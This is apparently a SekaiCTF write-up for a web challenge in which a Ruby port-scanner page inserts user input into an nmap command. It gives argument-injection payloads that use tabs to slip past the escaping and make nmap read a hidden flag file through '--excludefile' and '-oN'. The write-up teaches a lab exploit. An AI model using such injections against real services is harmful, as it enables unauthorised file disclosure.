---
layout: post
current: post
cover:  assets/sekai/nisala/scanner_cover.webp
navigation: True
title: "Vulnerability Scanner"
date: 2023-09-08 10:00:00
tags: [SekaiCTF, web]
class: post-template
subclass: 'post'
author: nisala
---

Scanner? Buddy!

In this challenge, we're presented with a vulnerability scanner, which we can use to scan for open ports at an IP.

![Image of the challenge website](/assets/sekai/nisala/scanner.webp)

Here's what the scanner is doing internally:

```rb
post '/' do
input_service = escape_shell_input(params[:service])
hostname, port = input_service.split ':', 2∑
begin
    if valid_ip? hostname and valid_port? port
        # Service up?
        s = TCPSocket.new(hostname, port.to_i)
        s.close
        # Assuming valid ip and port, this should be fine
        puts "nmap -p #{port} #{hostname}"
        @scan_result = IO.popen("nmap -p #{port} #{hostname}").read
    else
        @scan_result = "Invalid input detected, aborting scan!"
    end
end
```


Okay, so we're just inserting text into an `nmap` command. Should be simple enough to exploit, right? Well, it would be... except some characters are being escaped by the function on the second line: 

```
space, $, \`, ", |, &, ;, <, >, (, ), ', \n, *`
```

So that's a lot, but it's definitely not everything. Although it looks like we won't be able to chain commands to run something else in addition to nmap, we can still exploit `nmap` to do some things it shouldn't.

The first problem to get around is adding additional arguments to the `nmap` call. After all, spaces are escaped, right? And this is true... but they forgot about tabs. So we can just use tabs instead of spaces.

The next problem to tackle is what file reading technique to use. See, the flag is stored in a file at a randomized path, and there are a number of ways to get `nmap` to read files, from using nmap scripts like `http-put` to upload files to a remote server, to using a file as a list of places to scan, and more. We started with the second one because it seemed easier, and ended up with a payload like this:

```
# Tabs changed to spaces for readability
1.1.1.1:80 --excludefile /flag-????????????????????????????????.txt
```

This turns into the following `nmap` command:
```
nmap -p 80 --excludefile /flag-????????????????????????????????.txt 1.1.1.1
```

And if you just run this on a computer, it'll give you some great output:
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-08 20:34 UTC
Error resolving name "sekai{flag}": Name or service not known

QUITTING!
```

This doesn't work if you run it on the website, though: 

![Image of the challenge website, showing just a starting nmap output and nothing else](/assets/sekai/nisala/scanner_bad.webp)

It seems that this error is sent to `stderr`, but the scanner website only sends output from `stdout`. So, what can we do? Well, after some documentation reading, we realized that we can route all output to `stdout`:

```
# Tabs changed to spaces for readability
1.1.1.1:80 --excludefile /flag-????????????????????????????????.txt -oN	- stdout
```

And there's our flag!

![Image of the challenge website, showing the flag](/assets/sekai/nisala/scanner_flag.webp)

We actually "solved" this challenge hours before we actually did -- we had the right payload from the beginning, but we used "\t" in the input box instead of actual tabs because people on our team didn't set up the Docker container for the challenge and created our own reproduction instead. Lesson learned! :)
